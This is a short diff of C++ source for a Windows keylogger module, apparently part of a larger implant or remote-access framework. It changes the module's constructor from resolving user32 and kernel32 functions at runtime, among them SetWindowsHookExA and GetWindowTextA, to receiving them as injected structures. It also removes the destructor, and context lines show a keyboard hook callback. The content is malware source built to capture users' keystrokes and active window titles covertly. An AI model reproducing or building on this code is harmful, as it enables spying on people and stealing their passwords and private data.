@@ -417,40 +417,10 @@ LRESULT CALLBACK Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam) {
     }
 }
 
-mod_Keylogger::mod_Keylogger() {
-
-    this->hKernel32DLL = wrapLoadDLL("kernel32.dll");
-    this->hUser32DLL = wrapLoadDLL("user32.dll");
-    
-    if (this->hKernel32DLL) {
-        this->KERNEL32.pGetModuleHandleA = (st_Kernel32_KL::LPGETMODULEHANDLEA) wrapGetProcAddr(this->hKernel32DLL, "GetModuleHandleA"  );
-    }
-
-    if (this->hUser32DLL) {
-        this->USER32.pGetWindowTextA      = (st_User32_KL::LPGETWINDOWTEXTA)     wrapGetProcAddr(this->hUser32DLL, "GetWindowTextA"     );
-        this->USER32.pGetForegroundWindow = (st_User32_KL::LPGETFOREGROUNDWINDOW)wrapGetProcAddr(this->hUser32DLL, "GetForegroundWindow");
-        this->USER32.pUnhookWindowsHookEx = (st_User32_KL::LPUNHOOKWINDOWSHOOKEX)wrapGetProcAddr(this->hUser32DLL, "UnhookWindowsHookEx");
-        this->USER32.pCallNextHookEx      = (st_User32_KL::LPCALLNEXTHOOKEX)     wrapGetProcAddr(this->hUser32DLL, "CallNextHookEx"     );
-        this->USER32.pSetWindowsHookExA   = (st_User32_KL::LPSETWINDOWSHOOKEXA)  wrapGetProcAddr(this->hUser32DLL, "SetWindowsHookExA"  );
-        this->USER32.pPostQuitMessage     = (st_User32_KL::LPPOSTQUITMESSAGE)    wrapGetProcAddr(this->hUser32DLL, "PostQuitMessage"    );
-        this->USER32.pPeekMessageA        = (st_User32_KL::LPPEEKMESSAGEA)       wrapGetProcAddr(this->hUser32DLL, "PeekMessageA"       );
-        this->USER32.pGetMessageA         = (st_User32_KL::LPGETMESSAGEA)        wrapGetProcAddr(this->hUser32DLL, "GetMessageA"        );
-        this->USER32.pTranslateMessage    = (st_User32_KL::LPTRANSLATEMESSAGE)   wrapGetProcAddr(this->hUser32DLL, "TranslateMessage"   );
-        this->USER32.pDispatchMessageA    = (st_User32_KL::LPDISPATCHMESSAGEA)   wrapGetProcAddr(this->hUser32DLL, "DispatchMessageA"   );
-    }
-
+mod_Keylogger::mod_Keylogger(st_Kernel32& _kernel32, st_User32_KL& _user32) {
+    this->KERNEL32 = _kernel32;
+    this->USER32 = _user32;
     mod_Instance = this;
-}
-
-mod_Keylogger::~mod_Keylogger() {
-
-    if(this->hKernel32DLL) {
-        wrapFreeLibrary(this->hKernel32DLL);
-    }
-
-    if (this->hUser32DLL) {
-        wrapFreeLibrary(this->hUser32DLL);
-    }
 }
 
 void mod_Keylogger::Start() {
